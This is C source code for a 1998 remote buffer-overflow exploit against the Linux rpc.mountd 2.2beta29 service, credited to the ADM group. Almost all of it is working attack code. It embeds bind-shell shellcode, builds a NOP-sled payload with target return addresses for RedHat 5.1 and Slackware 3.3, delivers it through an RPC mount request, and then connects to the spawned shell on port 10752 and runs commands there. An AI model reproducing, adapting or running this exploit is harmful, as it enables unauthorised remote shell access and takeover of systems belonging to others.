/** thats a eleet version ! :> **/
/*
 * !i! - PRIVATE -- DO NOT DISTRIBUTE -- PRIVATE -- DO NOT DISTRIBUTE - i!i
 *
 * Linux rpc.mountd 2.2beta29 exploit
 *
 * Coded plaguez, Antilove, Mikasoft at the ADM Party (7/98) and stranJer!
 * 
 * Credits:
 *    - DiGiT for finding the vulnerability
 * Compile: rpcgen mount.x ; gcc exmnt.c
 */


#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <time.h>
#include <string.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <arpa/nameser.h>
#include <netdb.h>
#include <getopt.h>
#include "mount_clnt.c"
#include "mount_xdr.c"
#include "ADMgetip.c"

#define NOP       0x90
#define WAITPORT  10752
#define STKLEN    200

char buff[10000];

struct target
  {
    char desc[80];
    int systype;
    unsigned long addr;
    int addalign;
  };

struct target targets[] =
{
  {"RedHat Linux 5.1 k 2.0.35 rpc.mountd",	0, 0x08052d28, 0},
  {"Slakware 3.3 k 2.0.33+Solar_Designer's patch rpc.mountd 2.2beta29",
						0, 0x0805bbe0, 0},
};

char c0de[] =
 "\x33\xDB\x33\xC0\xB0\x1B\xCD\x80" /* alarm(0); */
 "\x33\xD2\x33\xc0\x8b\xDA\xb0\x06\xcd\x80\xfe\xc2\x75\xf4" /* close FDs */
  "\x31\xc0\xb0\x02\xcd\x80\x85\xc0\x75\x62\xeb\x62" /* w/  fork() */
//"\x31\xc0\xb0\x02\x90\x90\x85\xc0\x90\x90\xeb\x62" /* w/o fork() */
 "\x5e\x56\xac\x3c\xfd\x74\x06\xfe\xc0\x74\x0b" /* =\_ who wrote it? */
 "\xeb\xf5\xb0\x30\xfe\xc8\x88\x46\xff\xeb\xec" /* =/` hmm?  */
 "\x5e\xb0\x02\x89\x06\xfe\xc8\x89\x46\x04\xb0\x06\x89\x46\x08\xb0\x66\x31\xdb"
 "\xfe\xc3\x89\xf1\xcd\x80\x89\x06\xb0\x02\x66\x89\x46\x0c\xb0\x2a\x66\x89\x46"
 "\x0e\x8d\x46\x0c\x89\x46\x04\x31\xc0\x89\x46\x10\xb0\x10\x89\x46\x08\xb0"
 "\x66\xfe\xc3\xcd\x80\xb0\x01\x89\x46\x04\xb0\x66\xb3\x04\xcd\x80\xeb\x04"
 "\xeb\x4c\xeb\x52\x31\xc0\x89\x46\x04\x89\x46\x08\xb0\x66\xfe\xc3\xcd\x80"
 "\x88\xc3\xb0\x3f\x31\xc9\xcd\x80\xb0\x3f\xfe\xc1\xcd\x80\xb0\x3f\xfe\xc1"
 "\xcd\x80\xb8\x2e\x62\x69\x6e\x40\x89\x06\xb8\x2e\x73\x68\x21\x40\x89\x46"
 "\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e"
 "\x08\x8d\x56\x0c\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\x45\xff\xff"
 "\xff\xFF\xFD\xFF\x50\x72\x69\x76\x65\x74\x20\x41\x44\x4D\x63\x72\x65\x77";


void 
handle_alarm (sn)
     int sn;
{
  alarm (0);
  signal (SIGALRM, SIG_DFL);
  printf ("Unable to connect: Connection timed out\n");
  exit (0);
}


unsigned long
host2ip (char *serv)
{
  struct sockaddr_in sinn;
  struct hostent *hent;

  hent = gethostbyname (serv);
  if (hent == NULL)
    return 0;
  bzero ((char *) &sinn, sizeof (sinn));
  memcpy ((char *) &sinn.sin_addr, hent->h_addr, hent->h_length);
  return sinn.sin_addr.s_addr;
}


void 
addchar (char *str, char ch)
{
  unsigned int len;

  len = strlen (str);
  str[len] = ch;
  str[len + 1] = 0;
}


int 
ConnectServer (char *host, int port)
{
  int sockdesc;
  struct sockaddr_in sin;
  struct hostent *he;

  sin.sin_port = htons (port);
  sin.sin_family = AF_INET;

  he = gethostbyname (host);
  if (he)
    {
      memcpy ((caddr_t) & sin.sin_addr.s_addr, he->h_addr, he->h_length);
    }
  else
    {
      printf ("Error: gethostbyname(): Unable to resolve [%s]\n", host);
      exit (-1);
    }

  if ((sockdesc = socket (AF_INET, SOCK_STREAM, 0)) < 0)
    {
      perror ("Error: socket()");
      exit (-1);
    }
  if (connect (sockdesc, (struct sockaddr *) &sin, sizeof (sin)) < 0)
    {
      perror ("Error: connect()");
      exit (-1);
    }
  return sockdesc;
}


void 
MultiplexConnection (int sockdesc)
{
  int ret;
  char sockbuf[2048];
  fd_set readfds;

  sprintf (sockbuf, "trap '' SIGALRM SIGTRAP\n\
PATH=/usr/local/bin:/bin:/usr/bin:/sbin:/usr/sbin;export PATH\n\
/usr/sbin/rpc.mountd </dev/null\n\
/bin/uname -a;/usr/bin/id\n");
  write (sockdesc, sockbuf, strlen(sockbuf));

  while (1)
    {
      FD_ZERO (&readfds);
      FD_SET (0, &readfds);
      FD_SET (sockdesc, &readfds);
      select (255, &readfds, NULL, NULL, NULL);

      if (FD_ISSET (sockdesc, &readfds))
        {
          memset (sockbuf, 0, 2048);
          ret = read (sockdesc, sockbuf, 2048);
          if (ret <= 0)
            {
              printf ("Connection closed by foreign host.\n");
              exit (-1);
            }
          printf ("%s", sockbuf);
        }
      if (FD_ISSET (0, &readfds))
        {
          memset (sockbuf, 0, 2048);
          read (0, sockbuf, 2048);
          write (sockdesc, sockbuf, 2048);
        }
    }
}


int 
lookup_host (ra, hn, rp)
     struct sockaddr_in *ra;
     char *hn;
     unsigned short rp;
{
  ra->sin_family = AF_INET;
  ra->sin_port = htons (rp);
  if ((ra->sin_addr.s_addr = inet_addr (hn)) == -1)
    {
      struct hostent *he;

      if ((he = gethostbyname (hn)) != (struct hostent *) NULL)
        {
          memcpy (&ra->sin_addr.s_addr, he->h_addr, 4);
          return 1;
        }
      else
        herror ("Unable to resolve hostname");
    }
  else
    return 1;
  return 0;
}


int 
m00unt (char *host, char *buf)
{

  CLIENT *client;
  fhstatus *FH;
  dirpath DIR;
  char buffer[10000];
  int i;
  char c;

/* ini the stuff     */
/* mika is fuqn bad @ mace heheheh I OWN HIM %!@$!@$!@ :) */
  bzero (buffer, sizeof (buffer));
  DIR = buffer;

/* create the socket */

  if ((client = clnt_create (host, MOUNTPROG, MOUNTVERS, "udp")) == NULL)
    {
      printf ("rpc.mountd not registred :>\n");
      exit (2);
    }

  strncpy (DIR, buf, sizeof (buffer));

  if ((mountproc_mnt_1 (&DIR, client)) == -1)
    {
      printf ("mountproc_mnt failed :<\n");
      exit (0);
    }

}


void 
attack_mountd (loc)
     char *loc;
{
  int sockdesc;
  int status;

  switch (fork ())
    {
    case 0:
      m00unt (loc, buff);
      printf ("@#$%#!#$$\n");
      exit (1);
    case -1:
      printf ("fork error\n");
      exit (1);
    default:
      printf ("Attente connexion...\n");
      fflush (stdout);
      wait (&status);
    }

  sleep (5);
  sockdesc = ConnectServer (loc, WAITPORT);

  printf ("Shell found!\n");
  MultiplexConnection (sockdesc);

  close (sockdesc);

  exit (-1);

}


void 
usage (char *pname)
{
  int compt;

  printf ("\nUsage:\t%s targethost [-t type] [-o offset] [-a align]\n", pname);
  printf ("\ttargethost may either be name or ip.\n");
  printf ("\ttype chooses from a list of predefined targets.\n");
  for (compt = 0; compt < sizeof (targets) / (sizeof (struct target)); compt++)
    printf ("\t\t%i: %s\n", compt, targets[compt].desc);
  printf ("\toffset is the offset (not required if -t is used)\n");
  printf ("\talign is the alignment (not required if -t is used)\n\n");
}


int
host2a (unsigned long ipz)
{
  struct in_addr muf;
  muf.s_addr = ipz;
  return ((103 - (strlen (inet_ntoa (muf)))) % 4);
}


void 
main (argc, argv)
     int argc;
     char *argv[];
{
  int i;
  struct sockaddr_in ra;
  struct in_addr blah;
  unsigned long muf;
  char *ptr;
  char *endbuff;
  char *target = NULL;
  unsigned long addr;
  unsigned char jmp;
  long *l_ptr;
  int offset = 0;
  int bsize = 1024;
  int align = -1;
  int targ = 0;
  char o;
  char *argv0 = strdup (argv[0]);

  while ((o = getopt (argc, argv, "a:o:t:h")) != -1)
    switch (o)
      {
      case 'h':
        usage (argv0);
        exit (1);
      case 'o':
        if (optarg)
          offset -= atoi (optarg);
        break;
      case 't':
        if (optarg)
          targ = atoi (optarg);
        break;
      case 'a':
        if (optarg)
          align = atoi(optarg);
        break;
      }

  argc -= optind;
  argv += optind;
  target = *argv;

  if (!target)
    {
      usage (argv0);
      exit (1);
    }
  memset (buff, '\x90', bsize);

  printf ("selected target (-t %d): %s.\n", targ, targets[targ].desc);
  addr = targets[targ].addr;

  printf ("shellcode lenght: %i\n", strlen(c0de));
  printf ("buffer size: %i\n", bsize);

  addr += offset;
  printf ("offset: %d\n", offset);
  printf ("address: 0x%lx\n", addr);

  getlocalip (&muf, host2ip (target));
  blah.s_addr = muf;
  printf ("local ip = %s\n", inet_ntoa (blah));
  if (align < 0)
    align = host2a (muf);
  printf ("align = %i\n", align);
  align += targets[targ].addalign;

  endbuff = buff + bsize;

  for (ptr = buff; ptr < (endbuff - strlen(c0de) - STKLEN); ptr++)
    *ptr = NOP;

  for (i = 0; i < strlen(c0de); i++)
    *(ptr++) = c0de[i];

  for (ptr += align; ptr < endbuff; ptr += 4)
    {
      ptr[0] = (addr & 0x000000ff);
      ptr[1] = (addr & 0x0000ff00) >> 8;
      ptr[2] = (addr & 0x00ff0000) >> 16;
      ptr[3] = (addr & 0xff000000) >> 24;
    }

  *endbuff = '\x0';

  attack_mountd (target);
}

/* today 9 Aug 1998 */
